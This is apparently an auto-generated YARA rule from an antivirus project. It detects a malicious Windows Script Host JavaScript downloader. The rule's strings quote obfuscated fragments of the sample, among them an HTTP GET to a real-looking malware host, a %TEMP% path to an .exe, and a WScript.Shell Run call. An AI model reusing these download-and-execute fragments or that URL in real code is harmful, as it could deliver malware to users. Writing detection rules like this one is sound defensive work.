rule sig_20160328_a8998213506256753669f09c7d3c3159 {
  meta:
    description = "datamaliciousorder - file 20160328_a8998213506256753669f09c7d3c3159.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "20259ff73b8e3ea6a3df4e91ca7563d0ae80ebb97cc984464b2034da5b9fcf1b"

  strings:
    $s1  = "function Pjzkmlzw() {return Anltzggh[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"N4mm8b2hjV8.exe\";};" fullword ascii
    $s2  = "do {WScript[Pfemwjz](Awdhwdp() * 11)} while (Kqyiqeax[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "var Anltzggh = function Qyzlu() {return WScript[Ergurp](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Mpqcbpw(Cpacmmtiru, Axlghjadr){return Cpacmmtiru - Axlghjadr;};" fullword ascii
    $s5  = "Kqyiqeax[Pgughsdgy](\"GET\", \"http://lovelustandliving.ca/pow2lk\", false);" fullword ascii
    $s6  = "function Sdhkkhhh() {return ((Eixzcbh == true) && (Eixzcbh == Nlgzxsqc)) ? 1 : Myfnsyhbhf;};" fullword ascii
    $s7  = "function Mlqnx(Brmiqltx){Anltzggh[\"Run\"](Brmiqltx, Myfnsyhbhf, Myfnsyhbhf);};" fullword ascii
    $s8  = "return Mpqcbpw(Qexqiwhlp, Xloeulbtgi);" fullword ascii
    $s9  = "var Eixzcbh = false;" fullword ascii
    $s10 = "var Nlgzxsqc = false;" fullword ascii
    $s11 = "function Splffgth(Sidtsmnetu) {var Tqetijy = (1, 2, 3, 4, 5, Sidtsmnetu); return Tqetijy;};" fullword ascii
    $s12 = "Eixzcbh = true; " fullword ascii
    $s13 = "function Yqtdvhispn(){return Wzkdkbtwcq;};" fullword ascii
    $s14 = "var Gtplc = new this[\"Date\"]();" fullword ascii
    $s15 = "function Jdqvwv()" fullword ascii
    $s16 = "function Yimrzbe(){return Ergurp;};" fullword ascii
    $s17 = "var Dcfrdrzo = false;" fullword ascii
    $s18 = "function Awdhwdp(){return 22;};" fullword ascii
    $s19 = "Nlgzxsqc = true; " fullword ascii
    $s20 = "} catch(Jblzw){Cahsvwjbau = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}